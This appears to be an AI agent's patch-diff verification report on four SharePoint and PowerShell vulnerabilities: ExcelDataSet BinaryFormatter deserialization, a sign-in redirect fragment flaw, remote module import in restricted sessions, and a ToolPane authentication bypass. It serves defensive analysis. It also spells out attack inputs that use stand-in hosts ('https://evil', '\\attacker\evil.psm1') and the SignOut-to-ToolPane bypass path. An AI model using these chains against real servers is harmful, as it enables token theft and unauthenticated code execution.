# Final Verification Report

## Metadata
- Agent: Codex (GPT-5)
- Timestamp: 2025-11-20 14:16:43 UTC

## Verified Vulnerabilities

### 1. ExcelDataSet Safe Control exposes BinaryFormatter deserialization
**Diff evidence:**
```
diff --git .../cloudweb.config
@@ -158,6 +158,8 @@
       <SafeControl ... TypeName="SearchFarmDashboard" ... />
+      <SafeControl ... Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="ExcelDataSet" Safe="False" ... />
+      <SafeControl ... Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="ExcelDataSet" Safe="False" ... />
```
(similar insertions in every farm/web config; `AddExcelDataSetToSafeControls.cs` added at patch lines 73146‑73190 to push the entries.)

**V1 behaviour:**
`C__inetpub_wwwroot_wss_VirtualDirectories/80/web.config:236-245` shows `<SafeControl ... Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="*" />`, so any page author can place `<Scorecards:ExcelDataSet>` markup. In `ExcelDataSet.cs:39-77`:
```
if (dataTable == null && compressedDataTable != null)
{
    dataTable = Helper.GetObjectFromCompressedBase64String(compressedDataTable, ExpectedSerializationTypes) as DataTable;
}
```
`Helper.GetObjectFromCompressedBase64String` (`Helper.cs:580-598`) Base64‑decodes input, decompresses it, and calls `BinarySerialization.Deserialize` (`System/Data/BinarySerialization.cs:54-62`) which wraps `BinaryFormatter`. No validation exists; the `CompressedDataTable` attribute comes from page markup.

**Impact:** an editor or compromised site can feed crafted `BinaryFormatter` payloads via `CompressedDataTable`, resulting in arbitrary object graph instantiation under the SharePoint worker process.

**V2 fix:** every config now contains explicit `Safe="False"` entries for `ExcelDataSet` (both 15.0.0.0 and 16.0.0.0 assemblies) and the upgrade action adds them automatically, preventing untrusted markup from instantiating the class. The deserialization code remains, but it is no longer reachable to page authors.

**Confidence:** High.

### 2. ProofTokenSignIn allowed redirect fragments
**Diff evidence:**
```
diff --git .../ProofTokenSignInPage.cs
@@ -318,6 +320,11 @@
     if (null != RedirectUri)
     {
         result = IsAllowedRedirectUrl(RedirectUri);
+        if ((!((SPPersistedObject)(object)SPFarm.Local != (SPPersistedObject)null) || !SPFarm.Local.ServerDebugFlags.Contains(53020)) && !string.IsNullOrEmpty(RedirectUri.Fragment))
+        {
+            ULS... "Hash parameter is not allowed."
+            result = false;
+        }
     }
```

**V1 behaviour:** `RedirectUri` is read directly from the `redirect_uri` query parameter (`ProofTokenSignInPage.cs:45-66`). `FormActionValue` (lines 68-90) calls `ShouldRedirectWithProofToken()`, and v1’s version (lines 315-322) only ran `IsAllowedRedirectUrl`. That check validates host/subscription but ignores URL fragments. Result: `/_layouts/15/ProofTokenSignIn.aspx?redirect_uri=https://tenant/_layouts/15/AppRedirect.aspx#redirect_uri=https://evil` passes validation, the form posts to that URL, and client-side script reads the fragment and forwards the browser (with newly minted proof tokens) to the attacker’s endpoint.

**V2 fix:** fragments trigger an immediate denial unless farm flag 53020 is turned on, so `FormActionValue` no longer returns a URL with a fragment and the open redirect is closed.

**Confidence:** High.

### 3. Show-Command imported modules from UNC/device paths in restricted sessions
**Diff evidence:**
```
diff --git .../ShowCommandCommand.cs
@@ -399,6 +399,12 @@
     case 0:
         return;
     }
+    string path = FileSystemProvider.NormalizePath(...);
+    if (Utils.IsSessionRestricted(base.Context) && (PathIsNetworkPath(path) || Utils.PathIsDevicePath(path)))
+    {
+        ThrowTerminatingError(... "CommandNameNotAllowed" ...);
+    }
     string importModuleCommand = showCommandProxy.GetImportModuleCommand(...);
```

**V1 behaviour:** the same method (`ShowCommandCommand.cs:388-407`) immediately executed `Import-Module` for whatever path the GUI requested. In constrained sessions (`Utils.IsSessionRestricted` true) administrators rely on UNC/device paths being disallowed, but v1 happily ran `Import-Module \\attacker\evil.psm1`. That lets an attacker trick a restricted shell into loading remote code.

**V2 fix:** the added guard normalizes the path and aborts imports from network/device paths when the session is restricted, restoring the expected boundary.

**Confidence:** High.

### 4. ToolPane accessible after SignOut
**Diff evidence:**
```
diff --git .../SPRequestModule.cs
@@ -2720,10 +2720,19 @@
-        if (... || (uri != null && referrer matches SignOut))
+        bool flag8 = uri != null && matches SignOut paths;
+        if (... || flag8)
         {
             flag6 = false;
             flag7 = true;
+            bool flag9 = !SPFarm.CheckFlag((ServerDebugFlags)53506);
+            bool flag10 = context.Request.Path.EndsWith("ToolPane.aspx", StringComparison.OrdinalIgnoreCase);
+            if (flag9 && flag8 && flag10)
+            {
+                flag6 = true;
+                flag7 = false;
+                ULS... "Risky bypass limited (Access Denied) - signout with ToolPane.aspx detected."
+            }
         }
```

**V1 behaviour:** the original block (`SPRequestModule.cs:2708-2727`) set `flag6=false; flag7=true;` for SignOut traffic. Later, if the user is unauthenticated and `flag7` is true, the module suppresses the Access-Denied branch. Visiting `SignOut.aspx?Source=/_layouts/15/ToolPane.aspx` therefore lets the subsequent `_layouts/ToolPane.aspx` request execute even though the user is logged out. `ToolPane.cs:523-548` reads `MSOTlPn_Uri`, `MSOTlPn_DWP`, etc. from POST data and calls `GetPartPreviewAndPropertiesFromMarkup`, instantiating whatever markup was provided—an unauthenticated remote web-part load.

**V2 fix:** when the referrer is SignOut *and* the current path ends with `ToolPane.aspx` (and kill switch 53506 is off), the code re-enables cookie checks (`flag6=true`) so unauthenticated ToolPane requests hit the Access Denied path instead of executing.

**Confidence:** Medium-High (control-flow evidence is clear; exploitation impact assumes the ToolPane markup parsing remains reachable).

## Unmapped Security-Relevant Changes
1. **applicationHost.config** (`diff_reports … lines ~60-120`): removed the `_forms` virtual directory and its anonymous `location` block. *Unknown if security-motivated* (looks like hardening but no context provided).
2. **Delve API error handling** (`diff_reports … lines ~599360-599460`): added helper methods that set `TrySkipIisCustomErrors` and flush error responses explicitly. *Unknown if security-motivated* – likely reliability/diagnostics.

## Confirmation Summary
- ExcelDataSet Safe Control / BinaryFormatter: **Confirmed**.
- ProofTokenSignIn fragment validation: **Confirmed**.
- ShowCommand restricted-session import guard: **Confirmed**.
- ToolPane post-signout bypass: **Confirmed**.

No earlier hypothesis was rejected; all four findings now have concrete code evidence and reasoning.
